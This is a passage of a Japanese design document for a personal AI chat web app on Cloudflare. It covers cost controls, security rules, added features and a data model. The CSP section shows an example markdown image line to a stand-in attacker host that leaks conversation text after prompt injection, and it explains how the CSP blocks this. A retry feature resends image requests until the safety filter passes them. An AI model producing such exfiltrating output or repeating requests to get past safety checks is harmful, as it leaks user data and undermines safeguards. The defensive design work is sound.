    見積もりが混ざっていることは画面に出す。
- **使用量の画面**（`/usage`）: 今月・直近7日の合計と、モデル別の内訳、上限までの帯。
- **送信前のコスト推定警告**（未実装）:
  - 選択中モデルの入力 / 出力単価（モデル一覧 API から取得）をもとに、送信前にそのリクエストのコストを推定する。
    - 推定入力 = 会話履歴 + 添付 + 入力中テキストの概算トークン数 × 入力単価
    - 推定出力 = max_tokens（未設定時は既定の想定値）× 出力単価
  - 推定額が設定した基準額を超える場合、送信前に確認ダイアログで警告する。
  - 長い会話や高単価モデルへの切替時に、意図しない高額リクエストを防ぐ。
- **運用面の前提**（アプリ外の設定。セットアップ手順書に明記する）:
  - OpenRouter はプリペイドで少額ずつチャージし、自動チャージは無効のままにする。
  - アプリ用 API キーにはキー単位の利用上限（credit limit）を設定する。
  - Cloudflare は無料プランを維持する（超過時は課金ではなくリクエスト失敗となる）。

### 3.6.2 アプリを守るための決まりごと

Cloudflare Access がアプリ全体を覆っているが、それだけでは足りない部分を
アプリ側でも持つ。

- **別サイトからの書き換えを断る**: 書き換え（GET・HEAD 以外）は、要求元が
  自分自身であることを確かめてから通す。Cookie は「どのサイトから出た要求か」に
  関わらず付いていくので、Access で守られていても、他所のページに置いた form や
  fetch から**ログイン済みのブラウザで**呼ばれてしまう。
  - 見るのは `Sec-Fetch-Site`。ブラウザが付ける値で、ページ側からは書き換え
    られない。`same-site` も断る——Cookie は生成元より広く共有されるため。
  - 対応していない環境のために `Origin` も見る。どちらも無い場合だけ通す
    （curl などブラウザ以外からの呼び出し。そちらは Cookie も自動では付かない）。
  - 判定は Worker の入口に1箇所。ルートごとに足すと、足し忘れがそのまま穴になる。
- **アップロードの中身を確かめる**: 先頭のバイト（マジックナンバー）を読んで、
  申告された形式と合っているかを見る。ブラウザの申告（`File.type`）は詐称できる
  ので、それだけでは中身が画像でないものを画像として保存できてしまう。
  配信側にも `X-Content-Type-Options: nosniff` を付ける。
- **モデルが返したURLの扱い**: 生成画像の取り込みで外へ取りに行く前に、
  仕組み（http/https）と宛先（自分自身・私設アドレス・リンクローカル・
  `.internal`）を確かめる。宛先を決めるのはこちらではなくモデルの出力なので、
  そのまま取りに行かない。読み込む量にも上限を置き、超えたらその場で打ち切る。
- **ブラウザに外部を読ませない（CSP）**: 応答に
  `Content-Security-Policy` を付け、画像（`img-src`）と通信（`connect-src`）を
  自分のところだけに絞る。
  - 塞いでいるのは**本文の消毒では止められない**経路。インジェクションを受けた
    モデルが `![](https://攻撃者/?q=会話の中身)` を出力すると、記法としては
    正しい画像なので消毒を通過し、**表示しただけで**本文がクエリ文字列として
    相手に渡る。読みに行かせなければ成立しない。
  - 生成画像は取得して R2 に写し `/api/files/…` へ置き換えているので、ふだんは
    外部の画像を読む必要がない。写しそこねた分（保存が未設定・枠切れで持ち越し）は
    表示されなくなるが、**出さないほうが害が小さい**と判断する。
  - スクリプトは nonce（React Router が撒く分）と sha256（見た目の初期化
    スクリプト）で許す。`'unsafe-inline'` は本番では使わない——nonce があると
    ブラウザ側で無視されるうえ、緩めてあると誤読させるため。
  - 初期化スクリプトの本体とハッシュは**同じ定数**から取る
    （`app/lib/appearance-init.ts`）。埋め込む側で連結し直すと、ハッシュが黙って
    合わなくなり、画面にエラーを出さないままテーマがちらつくようになる。
  - 開発時は Vite が自前のインラインスクリプトと WebSocket を使うため、
    `script-src` と `connect-src` だけ緩める。`img-src` は本番と同じに保ち、
    違反に開発中に気づけるようにする。
- **埋め込みと差し込みを断つ**: `frame-ancestors 'none'`（クリックジャッキング）、
  `object-src 'none'`、`base-uri 'self'`、`form-action 'self'`。
  併せて `Referrer-Policy: same-origin` を付け、外部へ遷移したときに
  会話の URL を渡さない。

### 3.6.1 文書化されていなかった実装済みの機能

要件を決めたあとに足したもの。仕様の出所が分からなくならないよう、ここに残す。

- **引っぱって更新**: 会話画面と画像一覧で、一番上から下へ引くと取り直す。
  別の端末で進んだ内容や、通信が切れて取りこぼした続きを拾い直せる。
- **エッジスワイプ**: 画面の左端から右へ払うと会話一覧が開く（スマホ）。
- **先読みキャッシュ**: 会話リンクが画面に入った時点で内容を先に取る
  （`app/lib/chat-cache.ts`）。開いたときの待ちを消すため。
- **パフォーマンス計測**: 画面遷移にかかった時間を記録し、設定画面に出す
  （`app/lib/perf.ts`）。ビルドごとに区別できるよう短縮SHAを添える。
- **成功するまで生成（リトライ生成）**: 画像生成のセーフティ判定には揺らぎが
  あり、問題のない依頼でも弾かれることがある。目標の枚数に届くまで同じ依頼を
  投げ直す（`app/lib/retry.ts`）。上限試行回数はアプリ全体の天井を超えない。
- **URLの読み込みとリンク辿り**: 本文にURLがあれば内容を読み、その先の
  リンクも一段だけ辿る。
- **Escape で閉じる**: 重ねて出しているもの（メニュー・⚙のパネル・確認・
  フォルダ移動・削除の選択モード・ドロワー・拡大表示）は Escape で閉じる。
  一度に閉じるのは一番手前の1枚だけ。
- **指で使う端末向けの出し分け**: hover でだけ濃くする・出すという作りは、
  ポインタを載せられない端末では効かない。`touch` 変種（`@media (hover: none)`）で
  読める濃さと押せる大きさに切り替える（`app/app.css`）。

- デフォルトシステムプロンプトの設定。
- OpenRouter キーの残高表示（OpenRouter の credits API を利用、可能な範囲で）。**未実装。**
- コスト管理の設定: 月間の上限額、今月だけの一時解除、Poe のポイント換算レート（§3.6）。
  送信前警告の基準額は**未実装**。
- 既定のモデル・生成パラメータ・システムプロンプトの設定。**未実装**（既定モデルは
  `app/lib/constants.ts` に書いてある）。
- 表示設定（テーマ: ライト → ダーク → 自動 を巡回する単一アイコンボタン。サイドバー下部に常設。**ダークモード対応は必須要件**）。
  - テーマ・アクセント色・文字サイズは `<html>` の class / data 属性 / CSS変数として持つ（Reactが描く属性ではない）。ハイドレーションのやり直しが起きるとこれらは巻き添えで消えるため、マウント後・復帰時（PWAの再表示・bfcache）・端末の外観設定が変わったときに保存値から貼り直す。

- **アクセントカラー**: macOS のアクセントカラーと同様に、9色（ブルー / シアン / パープル / ピンク / レッド / オレンジ / イエロー / グリーン / グラファイト）から選べる。既定はブルー。サイドバー下部の色ドットで切替え、送信ボタン・自分の吹き出し・トグル等の強調色に一括適用される。ベース配色は無彩色（neutral）で、ライト/ダークとも青みを帯びない。

## 4. 非機能要件

| 項目 | 要件 |
|---|---|
| コスト | 通常利用で月額 0 円（Cloudflare 無料枠内）。上限 500 円/月 |
| セキュリティ | Cloudflare Access による本人限定アクセス。API キーはサーバー側 Secret のみ。Worker 側でも Access JWT を検証 |

| データ保全 | `npx wrangler d1 export chat-webui --output backup.sql` で書き出す（手動。README に記載） |
| 保守性 | プロバイダ（OpenRouter / fal / …）を抽象化した内部インターフェースを設け、追加プロバイダ対応時に UI 層の変更を最小化する |

## 5. データモデル（案）

```
bots
  id, name, icon, model_id, system_prompt,
  params_json, created_at, updated_at

conversations
  id, title, bot_id (nullable), model_id,
  pinned, favorite,             -- favorite = 常設「お気に入り」フォルダ
  current_leaf_message_id,
  created_at, updated_at

messages                      -- ツリー構造
  id, conversation_id,
  parent_id (nullable),       -- NULL はルート
  role ('user' | 'assistant' | 'system'),
  content,
  model_id,                   -- 応答生成に使ったモデル
  usage_json,                 -- トークン数・コスト
  context_boundary,           -- 1 = ここまでは以後モデルへ送らない
  created_at

attachments
  id, message_id (nullable), conversation_id, r2_key,
  mime_type, name, size, created_at

settings
  key, value_json              -- デフォルトモデル等
```

- ブランチは `messages.parent_id` によるツリーで表現。兄弟ノード = 分岐。
- `conversations.current_leaf_message_id` で表示中パスを復元。
